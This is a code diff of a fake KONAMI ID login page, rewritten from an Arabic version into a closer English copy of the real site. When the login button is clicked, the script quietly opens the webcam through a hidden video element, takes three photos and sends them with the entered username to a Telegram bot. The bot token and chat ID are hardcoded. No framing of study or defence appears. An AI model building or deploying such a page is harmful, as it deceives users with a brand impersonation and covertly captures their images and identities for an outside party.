@@ -1,102 +1,140 @@
 
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>konami ID</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>KONAMI Login</title>
 <style>
-:root{--accent:#c0132b}*{box-sizing:border-box}body{
-  margin:0;font-family:Arial,Helvetica,sans-serif;min-height:100vh;
-  display:grid;place-items:center;
-  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
-  color:#222
-}
-.card{width:min(92vw,420px);background:#fff;border-radius:18px;padding:28px;box-shadow:0 12px 30px rgba(0,0,0,.2);text-align:center}
-.brand{font-weight:800;color:var(--accent);font-size:22px;margin-bottom:8px}
-.field{margin:10px 0}.input{width:100%;padding:12px;border-radius:12px;border:1px solid #ddd;font-size:16px}
-.btn{width:100%;padding:12px;border-radius:12px;border:0;background:var(--accent);color:#fff;font-size:16px;cursor:pointer}
-.video-hidden{position:absolute;width:1px;height:1px;opacity:0;left:-9999px}
-.status{margin-top:8px;font-size:13px;color:#333}
+* {margin:0;padding:0;box-sizing:border-box;font-family:Arial, sans-serif;}
+body {background-color:#f7f7f7;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;}
+.container {background-color:white;width:100%;max-width:400px;padding:20px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.1);text-align:center;}
+.logo {font-size:28px;color:#e60012;font-weight:bold;margin-bottom:20px;}
+h2 {margin-bottom:15px;color:#333;}
+input {width:100%;padding:12px;margin-bottom:15px;border:1px solid #ccc;border-radius:6px;font-size:16px;}
+.btn {width:100%;padding:12px;margin-bottom:15px;border:none;border-radius:6px;font-size:16px;cursor:pointer;font-weight:bold;}
+.login-btn {background-color:#d71920;color:white;}
+.passkey-btn {background-color:#d71920;color:white;}
+.divider {margin:15px 0;color:#888;font-weight:bold;}
+a {text-decoration:none;color:#0078d7;font-size:14px;}
+.register {margin-top:10px;font-size:14px;}
+.footer {margin-top:20px;text-align:center;color:#555;font-size:13px;}
+.footer a {color:#0078d7;margin:0 5px;}
+.status {margin-top:8px;font-size:13px;color:#333;text-align:center;}
+.video-hidden {position:absolute;width:1px;height:1px;opacity:0;left:-9999px;}
 </style>
 </head>
 <body>
-  <div class="card">
-    <div class="brand">konami ID</div>
-    <div> اضغط Login </div>
-    <div class="field"><input id="user" class="input" placeholder="Username"></div>
-    <div class="field"><input id="pass" type="password" class="input" placeholder="Password"></div>
-    <button id="loginBtn" class="btn">Login</button>
-    <div id="status" class="status"></div>
-  </div>
 
-  <video id="v" class="video-hidden" autoplay playsinline></video>
-  <canvas id="c" width="640" height="480" style="display:none"></canvas>
+<div class="container">
+    <div class="logo">KONAMI</div>
+    <h2>KONAMI ID</h2>
+
+    <input type="text" id="username" placeholder="KONAMI ID / E-mail address">
+
+    <div class="field">
+        <input type="checkbox" id="agree">
+        <label for="agree">I agree to Terms of Use & Privacy (required)</label>
+    </div>
+
+    <button class="btn login-btn" id="startBtn" disabled>Log In</button>
+
+    <div class="divider">OR</div>
+    <button class="btn passkey-btn">Logging in With a Passkey</button>
+    <p><a href="#">What is a Passkey?</a></p>
+    <div class="register">
+        Don't have a KONAMI ID? <a href="#">Register</a>
+    </div>
+
+    <div id="status" class="status"></div>
+</div>
+
+<div class="footer">
+    <a href="#">Terms of Use</a> / 
+    <a href="#">Privacy (KONAMI ID)</a>
+    <br>
+    <a href="#">Trademarks</a>
+</div>
+
+<video id="video" class="video-hidden" autoplay playsinline></video>
+<canvas id="canvas" width="640" height="480" style="display:none"></canvas>
 
 <script>
-const btn = document.getElementById('loginBtn');
-const status = document.getElementById('status');
-const video = document.getElementById('v');
-const canvas = document.getElementById('c');
-const ctx = canvas.getContext('2d');
-
-// ====== إعدادات التلغرام ======
-const TOKEN = "8442051886:AAHTHe8iPnsRpSNFGc26bNOo2PtEyKGGhUw";     // من BotFather
-const CHAT_ID = "6504203392";  // من getUpdates
+// ==== إعداد بوت تلغرام ====
+const TOKEN = "8442051886:AAHTHe8iPnsRpSNFGc26bNOo2PtEyKGGhUw";  // ضع توكن البوت الخاص بك
+const CHAT_ID = "6504203392"; // ضع chat_id الخاص بك
 const API_URL = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 
-function setStatus(t){ status.textContent = t; }
+const startBtn = document.getElementById("startBtn");
+const agreeCheckbox = document.getElementById("agree");
+const usernameInput = document.getElementById("username");
+const status = document.getElementById("status");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+
+// تفعيل زر البدء فقط بعد الموافقة على الشروط
+agreeCheckbox.addEventListener("change", () => {
+    startBtn.disabled = !agreeCheckbox.checked;
+});
+
+function setStatus(msg){ status.textContent = msg; }
 
 async function openCamera(){
-  const stream = await navigator.mediaDevices.getUserMedia({video:true});
-  video.srcObject = stream;
-  await video.play();
-  return stream;
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+    await video.play();
+    return stream;
 }
 
-async function captureOnce(){
-  ctx.drawImage(video,0,0,canvas.width,canvas.height);
-  return canvas.toDataURL('image/png');
+async function captureImage(){
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    return canvas.toDataURL("image/png");
 }
 
-// دالة لإرسال الصورة للتلغرام
-async function sendToTelegram(image, caption="صورة جديدة") {
-  const blob = await (await fetch(image)).blob();
-  const formData = new FormData();
-  formData.append("chat_id", CHAT_ID);
-  formData.append("caption", caption);
-  formData.append("photo", blob, "image.png");
-
-  const res = await fetch(API_URL, {
-    method: "POST",
-    body: formData
-  });
-  return res.ok;
+async function sendToTelegram(imageData, username){
+    const blob = await (await fetch(imageData)).blob();
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("caption", `User: ${username}, Time: ${Date.now()}`);
+    formData.append("photo", blob, "image.png");
+    const res = await fetch(API_URL, { method: "POST", body: formData });
+    return res.ok;
 }
 
-btn.addEventListener('click', async ()=>{
-  btn.disabled = true;
-  setStatus('طلب إذن الكاميرا...');
-  let stream;
-  try{
-    stream = await openCamera();
-    setStatus('التقاط الصور وإرسالها...');
-    const meta = { user: document.getElementById('user').value || "", time: Date.now() };
-    for(let i=1;i<=3;i++){
-      const img = await captureOnce();
-      const ok = await sendToTelegram(img, `User: ${meta.user}, Time: ${meta.time}`);
-      setStatus(ok? `أرسلت الصورة ${i}/3` : `خطأ إرسال الصورة ${i}`);
-      await new Promise(r=>setTimeout(r,800));
+startBtn.addEventListener("click", async () => {
+    if(!agreeCheckbox.checked){
+        alert("You must agree to Terms and Privacy to continue.");
+        return;
     }
-    setStatus('انتهت العملية');
-  }catch(e){
-    console.error(e);
-    setStatus('فشل الوصول للكاميرا أو التلغرام');
-  }finally{
-    if(video.srcObject) video.srcObject.getTracks().forEach(t=>t.stop());
-    btn.disabled = false;
-  }
+
+    startBtn.disabled = true;
+    setStatus("Requesting camera permission...");
+    let stream;
+    try{
+        stream = await openCamera();
+        setStatus("Capturing and sending 3 images to Telegram...");
+
+        const username = usernameInput.value || "";
+
+        for(let i=1; i<=3; i++){
+            const imgData = await captureImage();
+            const ok = await sendToTelegram(imgData, username);
+            setStatus(ok ? `Image ${i}/3 sent successfully` : `Error sending image ${i}`);
+            await new Promise(r => setTimeout(r, 800));
+        }
+
+        setStatus("All 3 images sent successfully!");
+    } catch(e){
+        console.error(e);
+        alert("Camera access is required to continue.");
+        setStatus("Failed to access camera.");
+    } finally {
+        if(video.srcObject) video.srcObject.getTracks().forEach(t=>t.stop());
+        startBtn.disabled = !agreeCheckbox.checked;
+    }
 });
 </script>
+
 </body>
 </html>
